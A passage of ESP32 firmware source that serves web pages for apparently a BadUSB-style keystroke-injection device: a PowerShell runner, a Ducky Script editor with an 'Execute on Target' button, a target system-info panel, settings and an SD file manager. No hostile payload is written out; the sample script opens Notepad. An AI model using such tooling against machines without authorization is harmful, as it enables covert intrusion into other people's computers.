        require(['vs/editor/editor.main'], function() {
            scriptEditor = monaco.editor.create(document.getElementById('editorContainer'), {
                value: '# Paste a PowerShell script here, or select one to load.',
                language: 'powershell',
                theme: 'vs-dark',
                automaticLayout: true,
                minimap: { enabled: false },
                fontSize: 14,
                scrollBeyondLastLine: false
            });
        });

        function showToast(message, type = 'success') {
            const toast = document.createElement('div');
            toast.className = 'toast ' + type;
            toast.textContent = message;
            document.body.appendChild(toast);
            setTimeout(() => { toast.style.opacity = '0'; setTimeout(() => toast.remove(), 300); }, 3000);
        }

        function escapeHtml(text) {
            return text.replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;');
        }

        function setupEventSource() {
            const outputLog = document.getElementById('output-log');
            const eventSource = new EventSource('/events');
            
            eventSource.onopen = () => console.log("SSE Connection established");
            
            eventSource.addEventListener('message', (event) => {
                outputLog.innerHTML += escapeHtml(event.data) + '\n';
                outputLog.scrollTop = outputLog.scrollHeight;
            });

            eventSource.addEventListener('sysinfo', (event) => {
                try {
                    const data = JSON.parse(event.data);
                    document.getElementById('info-hostname').innerText = data.Hostname || 'N/A';
                    document.getElementById('info-user').innerText = data.CurrentUser || 'N/A';
                    const adminSpan = document.getElementById('info-admin');
                    adminSpan.innerText = data.IsAdmin ? '(ADMIN)' : '(User)';
                    adminSpan.className = data.IsAdmin ? 'admin-true' : 'admin-false';
                    document.getElementById('info-os').innerText = data.OS_Name || 'N/A';
                    document.getElementById('info-arch').innerText = data.OS_Architecture || 'N/A';
                } catch(e) { console.error("Failed to parse sysinfo:", e); }
            });

            eventSource.onerror = () => { 
                eventSource.close(); 
                setTimeout(setupEventSource, 5000); 
            };
        }
        
        function fetchRequestLog() {
            const deviceLogPanel = document.getElementById('device-log-panel');
            fetch('/get_logs')
                .then(response => response.text())
                .then(text => {
                    if (text) {
                        deviceLogPanel.innerHTML += escapeHtml(text);
                        deviceLogPanel.scrollTop = deviceLogPanel.scrollHeight;
                    }
                })
                .catch(e => console.error("Failed to fetch request log:", e));
        }

        function sendMessage() {
            var userInput = document.getElementById("userInput");
            var message = userInput.value.trim();
            if (!message) return;
            
            var chatbox = document.getElementById("chatbox");
            chatbox.innerHTML += '<div class="chat-message"><strong>You:</strong> ' + escapeHtml(message) + '</div>';
            chatbox.scrollTop = chatbox.scrollHeight;
            userInput.value = "";
            
            fetch("/submit", { 
                method: "POST", 
                headers: {"Content-Type": "application/x-www-form-urlencoded"}, 
                body: "query=" + encodeURIComponent(message) 
            })
            .then(response => response.text())
            .then(text => {
                chatbox.innerHTML += '<div class="chat-message"><strong>AI:</strong><pre>' + escapeHtml(text) + '</pre></div>';
                chatbox.scrollTop = chatbox.scrollHeight;
            })
            .catch(e => showToast("AI request failed: " + e, "error"));
        }
        
        function updateStatus() {
            fetch("/status")
                .then(r => r.json())
                .then(data => {
                    document.getElementById("status-ip").innerText = data.ip;
                    document.getElementById("status-rssi").innerText = data.rssi + " dBm";
                    document.getElementById("status-ssid").innerText = data.ssid;
                    document.getElementById("status-sd").innerText = data.free_sd + " / " + data.total_sd + " MB";
                })
                .catch(e => console.error("Status update failed:", e));
        }

        function executeScript() {
            var script = scriptEditor.getValue();
            if (!script.trim()) { 
                showToast("Script content is empty!", "error"); 
                return; 
            }
            showToast("Executing script...", "info");
            fetch("/execute", {
                method: "POST",
                headers: {"Content-Type": "application/x-www-form-urlencoded"},
                body: "script=" + encodeURIComponent(script)
            })
            .then(r => r.ok ? showToast("Script execution initiated") : showToast("Execution failed", "error"))
            .catch(e => showToast("Error: " + e, "error"));
        }

        function saveScript() {
            var name = document.getElementById("scriptName").value.trim();
            var content = scriptEditor.getValue();
            if (!name) { 
                showToast("Script name is required!", "error"); 
                return; 
            }
            fetch("/save_script", {
                method: "POST",
                headers: {"Content-Type": "application/x-www-form-urlencoded"},
                body: "name=" + encodeURIComponent(name) + "&content=" + encodeURIComponent(content)
            })
            .then(r => {
                if (r.ok) {
                    showToast("Script saved successfully");
                    loadScriptList();
                } else {
                    showToast("Failed to save script", "error");
                }
            })
            .catch(e => showToast("Error: " + e, "error"));
        }

        function deleteScript() {
            var name = document.getElementById("scriptName").value.trim();
            if (!name) { 
                showToast("Select a script to delete!", "error"); 
                return; 
            }
            if (!confirm("Are you sure you want to delete '" + name + "'?")) return;
            
            fetch("/delete_script", {
                method: "POST",
                headers: {"Content-Type": "application/x-www-form-urlencoded"},
                body: "name=" + encodeURIComponent(name)
            })
            .then(r => {
                if (r.ok) {
                    showToast("Script deleted");
                    loadScriptList();
                    document.getElementById("scriptName").value = "";
                    scriptEditor.setValue("");
                } else {
                    showToast("Failed to delete script", "error");
                }
            })
            .catch(e => showToast("Error: " + e, "error"));
        }

        function loadScript() {
            var name = document.getElementById("scriptList").value;
            document.getElementById("scriptName").value = name;
            if (name) {
                var path = "/scripts/" + name + ".txt";
                fetch("/files?path=" + encodeURIComponent(path))
                    .then(r => r.ok ? r.text() : Promise.reject("File not found"))
                    .then(content => scriptEditor.setValue(content))
                    .catch(e => {
                        showToast("Could not load script: " + e, "error");
                        scriptEditor.setValue("");
                    });
            } else {
                scriptEditor.setValue("");
            }
        }

        function loadScriptList() {
            fetch("/list_scripts")
                .then(r => r.json())
                .then(scripts => {
                    var list = document.getElementById("scriptList");
                    list.innerHTML = "<option value=''>Select a saved script</option>";
                    scripts.forEach(script => {
                        list.innerHTML += '<option value="' + script + '">' + script + '</option>';
                    });
                });
        }

        window.onload = () => {
            loadScriptList();
            updateStatus();
            setInterval(updateStatus, 10000);
            setupEventSource();
            setInterval(fetchRequestLog, 3000);
        };
    </script>
</body>
</html>
)WEBUI";
    server.send(200, "text/html", html);
}


// ============================================================================
// Settings Page
// ============================================================================
void handleSettingsPage() {
    if (!checkAuth()) return;
    logRequest(server);
    
    String html = R"rawliteral(
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>ESP32 Settings</title>
    <link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='.9em' font-size='90'>⚙️</text></svg>">
    <style>
        :root{--bg:#1a1a2e;--card:#16213e;--secondary:#0f3460;--accent:#e94560;--success:#00bf63;--danger:#ff6b6b;--text:#eaeaea;--dim:#a0a0a0;--border:#0f3460}
        *{box-sizing:border-box;margin:0;padding:0}
        body{font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,sans-serif;background:var(--bg);color:var(--text);line-height:1.6;padding:20px}
        .container{max-width:700px;margin:auto}
        header{background:linear-gradient(135deg,var(--card),var(--secondary));padding:1rem;margin-bottom:20px;border-radius:12px;display:flex;align-items:center;gap:15px}
        header a{color:var(--text);text-decoration:none;font-size:1.5rem;transition:transform .2s}
        header a:hover{transform:scale(1.1)}
        header h1{font-size:1.3rem}
        .card{background:var(--card);border-radius:12px;padding:25px;box-shadow:0 4px 20px rgba(0,0,0,.3)}
        .section{margin-bottom:25px;padding-bottom:20px;border-bottom:1px solid var(--border)}
        .section:last-child{border-bottom:none;margin-bottom:0;padding-bottom:0}
        .section h3{color:var(--accent);margin-bottom:15px;font-size:1rem;display:flex;align-items:center;gap:8px}
        .form-group{margin-bottom:15px}
        label{display:block;margin-bottom:5px;font-size:0.9rem;color:var(--dim)}
        input{width:100%;padding:12px;border-radius:8px;border:1px solid var(--border);background:var(--bg);color:var(--text);font-size:1rem;transition:border-color .2s}
        input:focus{outline:none;border-color:var(--accent)}
        button{width:100%;padding:14px;border-radius:8px;border:none;cursor:pointer;font-weight:600;font-size:1.1rem;background:var(--success);color:#fff;transition:all .2s;margin-top:10px}
        button:hover{opacity:0.9;transform:translateY(-1px)}
        button:active{transform:translateY(0)}
        .toast{position:fixed;bottom:20px;right:20px;padding:15px 25px;border-radius:8px;color:#fff;font-weight:600;z-index:9999;animation:slideIn .3s;box-shadow:0 4px 12px rgba(0,0,0,.3)}
        .toast.success{background:var(--success)}
        .toast.error{background:var(--danger)}
        @keyframes slideIn{from{transform:translateX(100%);opacity:0}to{transform:translateX(0);opacity:1}}
        @media(max-width:600px){.container{padding:10px}header{flex-direction:column;text-align:center}}
    </style>
</head>
<body>
    <div class="container">
        <header>
            <a href="/">← Back</a>
            <h1>Device Settings</h1>
        </header>
        <div class="card">
            <form id="settingsForm">
                <div class="section">
                    <h3>🔐 Authentication</h3>
                    <div class="form-group"><label for="auth_username">Username</label><input type="text" id="auth_username" name="auth_username" autocomplete="username"></div>
                    <div class="form-group"><label for="auth_password">Password</label><input type="password" id="auth_password" name="auth_password" autocomplete="new-password"></div>
                </div>
                <div class="section">
                    <h3>📶 WiFi Configuration</h3>
                    <div class="form-group"><label for="ssid">WiFi SSID</label><input type="text" id="ssid" name="ssid"></div>
                    <div class="form-group"><label for="password">WiFi Password</label><input type="password" id="password" name="password"></div>
                </div>
                <div class="section">
                    <h3>🤖 AI Configuration</h3>
                    <div class="form-group"><label for="openai_api_key">OpenAI API Key</label><input type="password" id="openai_api_key" name="openai_api_key"></div>
                    <div class="form-group"><label for="model">AI Model</label><input type="text" id="model" name="model"></div>
                    <div class="form-group"><label for="max_completion_tokens">Max Tokens</label><input type="number" id="max_completion_tokens" name="max_completion_tokens"></div>
                    <div class="form-group"><label for="temperature">Temperature (0.0 - 2.0)</label><input type="number" step="0.01" min="0" max="2" id="temperature" name="temperature"></div>
                </div>
                <div class="section">
                    <h3>⌨️ Keyboard Settings</h3>
                    <div class="form-group"><label for="typing_delay">Typing Delay (ms)</label><input type="number" id="typing_delay" name="typing_delay" min="0" max="1000"></div>
                    <div class="form-group"><label for="command_delay">Command Delay (ms)</label><input type="number" id="command_delay" name="command_delay" min="0" max="1000"></div>
                    <div class="form-group"><label for="add_more_delay">Additional Delay (ms)</label><input type="number" step="5" id="add_more_delay" name="add_more_delay" min="0"></div>
                </div>
                <button type="button" onclick="saveSettings()">💾 Save Settings</button>
            </form>
        </div>
    </div>
    <script>
        function showToast(message, type = 'success') {
            const toast = document.createElement('div');
            toast.className = 'toast ' + type;
            toast.textContent = message;
            document.body.appendChild(toast);
            setTimeout(() => { toast.style.opacity = '0'; setTimeout(() => toast.remove(), 300); }, 3000);
        }

        function loadSettings() {
            fetch('/settings')
                .then(r => r.json())
                .then(data => {
                    for (const key in data) {
                        const el = document.getElementById(key);
                        if (el) el.value = data[key];
                    }
                })
                .catch(e => showToast("Failed to load settings", "error"));
        }

        function saveSettings() {
            const form = document.getElementById('settingsForm');
            const formData = new FormData(form);
            const data = Object.fromEntries(formData.entries());
            
            fetch('/settings', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(data),
            })
            .then(r => {
                if (r.ok) {
                    showToast("Settings saved successfully!");
                } else {
                    showToast("Failed to save settings", "error");
                }
            })
            .catch(e => showToast("Error: " + e, "error"));
        }

        window.onload = loadSettings;
    </script>
</body>
</html>
)rawliteral";
    server.send(200, "text/html", html);
}


// ============================================================================
// File Manager Page
// ============================================================================
void handleFileManagerPage() {
    if (!checkAuth()) return;
    logRequest(server);
    
    String html = R"rawliteral(
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>ESP32 File Manager</title>
    <link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='.9em' font-size='90'>📁</text></svg>">
    <style>
        :root{--bg:#1a1a2e;--card:#16213e;--secondary:#0f3460;--accent:#e94560;--success:#00bf63;--danger:#ff6b6b;--text:#eaeaea;--dim:#a0a0a0;--border:#0f3460}
        *{box-sizing:border-box;margin:0;padding:0}
        body{font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,sans-serif;background:var(--bg);color:var(--text);padding:20px}
        .container{max-width:1000px;margin:auto}
        header{background:linear-gradient(135deg,var(--card),var(--secondary));padding:1rem;margin-bottom:20px;border-radius:12px;display:flex;align-items:center;gap:15px}
        header a{color:var(--text);text-decoration:none;font-size:1.5rem;transition:transform .2s}
        header a:hover{transform:scale(1.1)}
        header h1{font-size:1.3rem}
        .card{background:var(--card);border-radius:12px;padding:20px;box-shadow:0 4px 20px rgba(0,0,0,.3)}
        .toolbar{display:flex;gap:10px;margin-bottom:20px;flex-wrap:wrap}
        .toolbar input{flex:1;min-width:200px;padding:12px;border-radius:8px;border:1px solid var(--border);background:var(--bg);color:var(--text)}
        .toolbar input:focus{outline:none;border-color:var(--accent)}
        .toolbar button{padding:12px 20px;border-radius:8px;border:none;cursor:pointer;font-weight:600;background:var(--success);color:#fff;transition:all .2s}
        .toolbar button:hover{opacity:0.9;transform:translateY(-1px)}
        #currentPath{padding:12px;background:var(--bg);border-radius:8px;margin-bottom:15px;font-family:'Fira Code',monospace;word-break:break-all;font-size:0.9rem;border-left:3px solid var(--accent)}
        table{width:100%;border-collapse:collapse}
        th,td{padding:12px;text-align:left;border-bottom:1px solid var(--border)}
        th{background:var(--secondary);font-weight:600}
        tr:hover{background:rgba(255,255,255,0.03)}
        td a{color:var(--text);text-decoration:none;font-weight:500;cursor:pointer;display:flex;align-items:center;gap:8px}
        td a:hover{color:var(--accent)}
        .file-icon{font-size:1.2rem}
        .action-btn{color:#fff;border:none;padding:8px 14px;border-radius:6px;cursor:pointer;font-weight:600;font-size:0.85rem;transition:all .2s}
        .action-btn.danger{background:var(--danger)}
        .action-btn:hover{opacity:0.9;transform:translateY(-1px)}
        .modal{display:none;position:fixed;z-index:1000;left:0;top:0;width:100%;height:100%;overflow:auto;background-color:rgba(0,0,0,0.8)}
        .modal-content{background:var(--card);margin:5% auto;padding:20px;border-radius:12px;width:90%;max-width:900px;max-height:80vh;display:flex;flex-direction:column;box-shadow:0 4px 30px rgba(0,0,0,.5)}
        .modal-header{display:flex;justify-content:space-between;align-items:center;border-bottom:2px solid var(--accent);padding-bottom:15px;margin-bottom:15px}
        .modal-header h2{font-size:1.1rem;display:flex;align-items:center;gap:8px}
        .close-btn{color:var(--dim);font-size:1.8rem;font-weight:bold;cursor:pointer;transition:color .2s}
        .close-btn:hover{color:var(--text)}
        #fileContent{background:var(--bg);color:var(--text);white-space:pre-wrap;word-wrap:break-word;overflow-y:auto;padding:15px;border-radius:8px;font-family:'Fira Code','Courier New',monospace;font-size:0.9rem;flex:1}
        .toast{position:fixed;bottom:20px;right:20px;padding:15px 25px;border-radius:8px;color:#fff;font-weight:600;z-index:9999;animation:slideIn .3s;box-shadow:0 4px 12px rgba(0,0,0,.3)}
        .toast.success{background:var(--success)}
        .toast.error{background:var(--danger)}
        @keyframes slideIn{from{transform:translateX(100%);opacity:0}to{transform:translateX(0);opacity:1}}
        @media(max-width:600px){.toolbar{flex-direction:column}.toolbar input,.toolbar button{width:100%}th:nth-child(2),td:nth-child(2){display:none}}
    </style>
</head>
<body>
    <div class="container">
        <header>
            <a href="/">← Back</a>
            <h1>SD Card File Manager</h1>
        </header>
        <div class="card">
            <div class="toolbar">
                <input type="text" id="newItemName" placeholder="New file or directory name...">
                <button onclick="createItem('file')">📄 Create File</button>
                <button onclick="createItem('dir')">📁 Create Dir</button>
            </div>
            <div id="currentPath">📂 /</div>
            <table>
                <thead><tr><th>Name</th><th>Size</th><th>Actions</th></tr></thead>
                <tbody id="fileList"></tbody>
            </table>
        </div>
    </div>
    
    <div id="fileModal" class="modal">
        <div class="modal-content">
            <div class="modal-header">
                <h2>📄 <span id="modalFileName"></span></h2>
                <span class="close-btn" onclick="closeModal()">×</span>
            </div>
            <pre id="fileContent"></pre>
        </div>
    </div>

    <script>
        let currentPath = '/';
        const modal = document.getElementById('fileModal');

        function showToast(message, type = 'success') {
            const toast = document.createElement('div');
            toast.className = 'toast ' + type;
            toast.textContent = message;
            document.body.appendChild(toast);
            setTimeout(() => { toast.style.opacity = '0'; setTimeout(() => toast.remove(), 300); }, 3000);
        }

        function formatBytes(bytes, decimals = 1) {
            if (!+bytes) return '0 B';
            const k = 1024;
            const sizes = ['B', 'KB', 'MB', 'GB'];
            const i = Math.floor(Math.log(bytes) / Math.log(k));
            return parseFloat((bytes / Math.pow(k, i)).toFixed(decimals)) + ' ' + sizes[i];
        }

        function renderFileList(files) {
            const fileListBody = document.getElementById('fileList');
            let content = '';
            
            if (currentPath !== '/') {
                let upPath = currentPath.substring(0, currentPath.lastIndexOf('/')) || '/';
                content += '<tr><td><a onclick="fetchFiles(\'' + upPath + '\')"><span class="file-icon">📁</span> ..</a></td><td></td><td></td></tr>';
            }
            
            files.sort((a, b) => (a.type === b.type) ? a.name.localeCompare(b.name) : (a.type === 'dir' ? -1 : 1))
                .forEach(f => {
                    const icon = f.type === 'dir' ? '📁' : '📄';
                    const path = (currentPath === '/' ? '' : currentPath) + '/' + f.name;
                    const onclick = f.type === 'dir' ? "fetchFiles('" + path + "')" : "viewFile('" + path + "')";
                    content += '<tr>';
                    content += '<td><a onclick="' + onclick + '"><span class="file-icon">' + icon + '</span> ' + f.name + '</a></td>';
                    content += '<td>' + (f.type === 'file' ? formatBytes(f.size) : '—') + '</td>';
                    content += '<td><button class="action-btn danger" onclick="deleteItem(\'' + path + '\')">Delete</button></td>';
                    content += '</tr>';
                });
            fileListBody.innerHTML = content;
        }

        function fetchFiles(path) {
            currentPath = path;
            document.getElementById('currentPath').textContent = '📂 ' + path;
            fetch('/files?path=' + encodeURIComponent(path))
                .then(r => r.ok ? r.json() : Promise.reject('Network error'))
                .then(data => renderFileList(data))
                .catch(e => showToast('Error fetching file list: ' + e, 'error'));
        }

        function viewFile(path) {
            fetch('/files?path=' + encodeURIComponent(path))
                .then(r => r.ok ? r.text() : Promise.reject('Could not load file'))
                .then(text => {
                    document.getElementById('modalFileName').textContent = path.substring(path.lastIndexOf('/') + 1);
                    document.getElementById('fileContent').textContent = text;
                    modal.style.display = 'block';
                })
                .catch(e => showToast('Error viewing file: ' + e, 'error'));
        }
        
        function createItem(type) {
            const nameInput = document.getElementById('newItemName');
            const newItemName = nameInput.value.trim();
            if (!newItemName) {
                showToast('Please enter a name', 'error');
                return;
            }
            if (/[~#%&*:<>?\/\\{|}"]/.test(newItemName)) {
                showToast('Name contains invalid characters', 'error');
                return;
            }

            const path = (currentPath === '/' ? '' : currentPath) + '/' + newItemName;
            const endpoint = type === 'file' ? '/create_file' : '/create_dir';

            fetch(endpoint, {
                method: 'POST',
                headers: {'Content-Type': 'application/x-www-form-urlencoded'},
                body: 'path=' + encodeURIComponent(path)
            })
            .then(response => {
                if (response.ok) {
                    showToast((type === 'file' ? 'File' : 'Directory') + ' created successfully');
                    nameInput.value = '';
                    fetchFiles(currentPath);
                } else {
                    return response.text().then(text => { throw new Error(text); });
                }
            })
            .catch(error => showToast('Error: ' + error.message, 'error'));
        }

        function deleteItem(path) {
            if (!confirm('Are you sure you want to delete "' + path + '"?\nThis cannot be undone.')) return;
            
            fetch('/delete_file', { 
                method: 'POST', 
                body: 'path=' + encodeURIComponent(path), 
                headers: {'Content-Type': 'application/x-www-form-urlencoded'} 
            })
            .then(r => {
                if (r.ok) {
                    showToast('Item deleted successfully');
                    fetchFiles(currentPath);
                } else {
                    showToast('Failed to delete item', 'error');
                }
            })
            .catch(e => showToast('Error: ' + e, 'error'));
        }

        function closeModal() { modal.style.display = 'none'; }
        window.onclick = (event) => { if (event.target == modal) closeModal(); }
        window.onload = () => fetchFiles('/');
    </script>
</body>
</html>
)rawliteral";
    server.send(200, "text/html", html);
}


// ============================================================================
// Ducky Script Studio Page
// ============================================================================
void handleDuckyPage() {
    if (!checkAuth()) return;
    logRequest(server);
    
    String html = R"WEBUI(
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Ducky Script Studio</title>
    <link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='.9em' font-size='90'>🦆</text></svg>">
    <script src="https://cdn.jsdelivr.net/npm/monaco-editor@0.34.0/min/vs/loader.js"></script>
    <style>
        :root{--bg:#1a1a2e;--card:#16213e;--secondary:#0f3460;--accent:#e94560;--success:#00bf63;--danger:#ff6b6b;--text:#eaeaea;--dim:#a0a0a0;--border:#0f3460}
        *{box-sizing:border-box;margin:0;padding:0}
        html,body{height:100%;margin:0;padding:0;overflow:hidden}
        body{font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,sans-serif;background:var(--bg);color:var(--text)}
        .page-wrapper{display:flex;flex-direction:column;height:100vh;padding:15px}
        header{flex-shrink:0;background:linear-gradient(135deg,var(--card),var(--secondary));padding:1rem;margin-bottom:15px;border-radius:12px;display:flex;align-items:center;gap:15px}
        header a{color:var(--text);text-decoration:none;font-size:1.5rem;transition:transform .2s}
        header a:hover{transform:scale(1.1)}
        header h1{font-size:1.3rem}
        .content-container{display:flex;gap:15px;flex-grow:1;min-height:0}
        .toolbar{flex:0 0 220px;background:var(--card);padding:15px;border-radius:12px;overflow-y:auto}
        .toolbar h3{color:var(--accent);margin-bottom:15px;font-size:1rem;border-bottom:2px solid var(--accent);padding-bottom:10px}
        .main-content{flex-grow:1;display:flex;flex-direction:column;min-width:0}
        .main-content h2{margin-bottom:10px;font-size:1.1rem;color:var(--accent)}
        #editor-container{width:100%;flex-grow:1;border:1px solid var(--border);border-radius:8px;overflow:hidden}
        .cmd-btn{background:var(--secondary);color:var(--text);border:none;border-radius:8px;padding:10px 12px;margin-bottom:8px;width:100%;text-align:left;cursor:pointer;font-size:0.9rem;font-weight:500;transition:all .2s}
        .cmd-btn:hover{background:var(--accent);transform:translateX(3px)}
        .action-bar{flex-shrink:0;padding-top:15px}
        .btn-row{display:flex;gap:10px;margin-bottom:10px}
        .btn-row select,.btn-row input{flex:1;padding:12px;border-radius:8px;border:1px solid var(--border);background:var(--bg);color:var(--text);font-size:0.95rem}
        .btn-row select:focus,.btn-row input:focus{outline:none;border-color:var(--accent)}
        .btn-row button,.btn-row label{padding:12px 18px;border-radius:8px;border:none;cursor:pointer;font-size:0.95rem;font-weight:600;background:var(--secondary);color:var(--text);text-align:center;transition:all .2s;white-space:nowrap}
        .btn-row button:hover,.btn-row label:hover{background:var(--accent);transform:translateY(-1px)}
        .btn-row button.danger{background:var(--danger)}
        .btn-row button.success{background:var(--success)}
        .toast{position:fixed;bottom:20px;right:20px;padding:15px 25px;border-radius:8px;color:#fff;font-weight:600;z-index:9999;animation:slideIn .3s;box-shadow:0 4px 12px rgba(0,0,0,.3)}
        .toast.success{background:var(--success)}
        .toast.error{background:var(--danger)}
        .toast.info{background:var(--secondary)}
        @keyframes slideIn{from{transform:translateX(100%);opacity:0}to{transform:translateX(0);opacity:1}}
        @media(max-width:768px){.content-container{flex-direction:column}.toolbar{flex:0 0 auto;max-height:150px}.btn-row{flex-wrap:wrap}.btn-row select,.btn-row input,.btn-row button,.btn-row label{min-width:calc(50% - 5px)}}
    </style>
</head>
<body>
    <div class="page-wrapper">
        <header>
            <a href="/">← Back</a>
            <h1>🦆 Ducky Script Studio</h1>
        </header>
        
        <div class="content-container">
            <div class="toolbar">
                <h3>Command Palette</h3>
                <button class="cmd-btn" onclick="insertCommand('REM ')">💬 REM (Comment)</button>
                <button class="cmd-btn" onclick="insertCommand('DELAY ')">⏱️ DELAY</button>
                <button class="cmd-btn" onclick="insertCommand('STRING ')">📝 STRING</button>
                <button class="cmd-btn" onclick="insertCommand('ENTER\n')">↵ ENTER</button>
                <button class="cmd-btn" onclick="insertCommand('GUI r\n')">🪟 GUI r (Run)</button>
                <button class="cmd-btn" onclick="insertCommand('GUI ')">🪟 GUI (Win Key)</button>
                <button class="cmd-btn" onclick="insertCommand('CTRL ')">⌃ CTRL</button>
                <button class="cmd-btn" onclick="insertCommand('ALT ')">⌥ ALT</button>
                <button class="cmd-btn" onclick="insertCommand('SHIFT ')">⇧ SHIFT</button>
                <button class="cmd-btn" onclick="insertCommand('CTRL-ALT ')">⌃⌥ CTRL-ALT</button>
                <button class="cmd-btn" onclick="insertCommand('CTRL-SHIFT ')">⌃⇧ CTRL-SHIFT</button>
                <button class="cmd-btn" onclick="insertCommand('TAB\n')">⇥ TAB</button>
                <button class="cmd-btn" onclick="insertCommand('ESCAPE\n')">⎋ ESCAPE</button>
                <button class="cmd-btn" onclick="insertCommand('DELETE\n')">⌫ DELETE</button>
                <button class="cmd-btn" onclick="insertCommand('UP\n')">↑ UP ARROW</button>
                <button class="cmd-btn" onclick="insertCommand('DOWN\n')">↓ DOWN ARROW</button>
                <button class="cmd-btn" onclick="insertCommand('DEFAULT_DELAY ')">🔄 DEFAULT_DELAY</button>
            </div>
            
            <div class="main-content">
                <h2>Script Editor</h2>
                <div id="editor-container"></div>
                
                <div class="action-bar">
                    <div class="btn-row">
                        <select id="scriptList" onchange="loadDuckyScript()">
                            <option value="">Load Saved Script...</option>
                        </select>
                        <input type="text" id="scriptName" placeholder="Script name to save...">
                        <button class="success" onclick="saveDuckyScript()">💾 Save</button>
                    </div>
                    <div class="btn-row">
                        <label for="importFile">📂 Import .txt</label>
                        <input type="file" id="importFile" onchange="importDuckyScript()" style="display:none;" accept=".txt">
                        <button class="danger" onclick="executeDucky()">▶️ Execute on Target</button>
                    </div>
                </div>
            </div>
        </div>
    </div>

    <script>
        var duckyEditor;
        
        require.config({ paths: { 'vs': 'https://cdn.jsdelivr.net/npm/monaco-editor@0.34.0/min/vs' }});
        require(['vs/editor/editor.main'], function() {
            // Register Ducky Script language
            monaco.languages.register({ id: 'ducky' });
            monaco.languages.setMonarchTokensProvider('ducky', {
                tokenizer: {
                    root: [
                        [/REM.*/, 'comment'],
                        [/\b(STRING|DELAY|ENTER|GUI|WINDOWS|CTRL|ALT|SHIFT|UP|DOWN|LEFT|RIGHT|DELETE|TAB|ESCAPE|BACKSPACE|SPACE|CAPSLOCK|F[1-9]|F1[0-2]|DEFAULT_DELAY|DEFAULTDELAY|REPEAT)\b/, 'keyword'],
                        [/\d+/, 'number'],
                    ]
                }
            });
            
            duckyEditor = monaco.editor.create(document.getElementById('editor-container'), {
                value: 'REM Ducky Script Editor\nREM Enter your commands below\n\nDELAY 1000\nGUI r\nDELAY 500\nSTRING notepad\nENTER\nDELAY 1000\nSTRING Hello from ESP32!',
                language: 'ducky',
                theme: 'vs-dark',
                automaticLayout: true,
                minimap: { enabled: false },
                fontSize: 14,
                scrollBeyondLastLine: false
            });
        });

        function showToast(message, type = 'success') {
            const toast = document.createElement('div');
            toast.className = 'toast ' + type;
            toast.textContent = message;
            document.body.appendChild(toast);
            setTimeout(() => { toast.style.opacity = '0'; setTimeout(() => toast.remove(), 300); }, 3000);
        }

        function insertCommand(command) {
            var position = duckyEditor.getPosition();
            duckyEditor.executeEdits('my-source', [{
                range: new monaco.Range(position.lineNumber, position.column, position.lineNumber, position.column),
                text: command
            }]);
            duckyEditor.focus();
        }

        function importDuckyScript() {
            const fileInput = document.getElementById('importFile');
            if (fileInput.files.length === 0) return;
            
            const file = fileInput.files[0];
            const reader = new FileReader();
            reader.onload = (e) => {
                duckyEditor.setValue(e.target.result);
                showToast('Script imported: ' + file.name);
            };
            reader.readAsText(file);
            document.getElementById('scriptName').value = file.name.replace(/\.[^/.]+$/, "");
        }

        function executeDucky() {
            const scriptContent = duckyEditor.getValue();
            if (!scriptContent.trim()) {
                showToast("Script is empty!", "error");
                return;
            }
            
            showToast("Executing script...", "info");
            fetch('/execute_ducky', {
                method: 'POST',
                headers: { 'Content-Type': 'text/plain' },
                body: scriptContent
            })
            .then(r => {
                if (r.ok) {
                    showToast("Ducky Script execution initiated");
                } else {
                    showToast("Execution failed", "error");
                }
            })
            .catch(e => showToast("Error: " + e, "error"));
        }

        function saveDuckyScript() {
            const scriptName = document.getElementById('scriptName').value.trim();
            const scriptContent = duckyEditor.getValue();
            
            if (!scriptName) {
                showToast("Please enter a name to save the script", "error");
                return;
            }
            
            fetch('/save_script', {
                method: 'POST',
                headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
                body: 'path=/ducky_scripts/' + encodeURIComponent(scriptName) + '.txt&content=' + encodeURIComponent(scriptContent)
            })
            .then(r => {
                if (r.ok) {
                    showToast("Script saved successfully");
                    loadDuckyScriptList();
                } else {
                    showToast("Failed to save script", "error");
                }
            })
            .catch(e => showToast("Error: " + e, "error"));
        }

        function loadDuckyScript() {
            const scriptName = document.getElementById('scriptList').value;
            if (!scriptName) return;
            
            document.getElementById('scriptName').value = scriptName;
            fetch('/files?path=/ducky_scripts/' + encodeURIComponent(scriptName) + '.txt')
                .then(r => r.ok ? r.text() : Promise.reject('File not found'))
                .then(content => {
                    duckyEditor.setValue(content);
                    showToast("Script loaded: " + scriptName);
                })
                .catch(e => showToast("Error loading script: " + e, "error"));
        }

        function loadDuckyScriptList() {
            fetch('/files?path=/ducky_scripts')
                .then(r => r.ok ? r.json() : Promise.resolve([]))
                .then(files => {
                    const list = document.getElementById('scriptList');
                    list.innerHTML = "<option value=''>Load Saved Script...</option>";
                    files.forEach(file => {
                        if (file.name.endsWith('.txt')) {
                            const scriptName = file.name.replace('.txt', '');
                            list.innerHTML += '<option value="' + scriptName + '">' + scriptName + '</option>';
                        }
                    });
                });
        }

        window.onload = loadDuckyScriptList;
    </script>
</body>
</html>
)WEBUI";
    server.send(200, "text/html", html);
}






void handleNotFoundRouter() {
    if (server.uri().startsWith("/f/")) {
        handleFileServer();
    } else {
        logRequest(server);
        server.send(404, "text/plain", "404 Not Found");
    }
}

void handleFileUpload() {
    if (!checkAuth()) return;
    
    HTTPUpload& upload = server.upload();
    if (upload.status == UPLOAD_FILE_START) {
        String filename = "/" + upload.filename;
        if (isValidPath(filename)) {
            uploadFile = SD.open(filename, FILE_WRITE);
        }
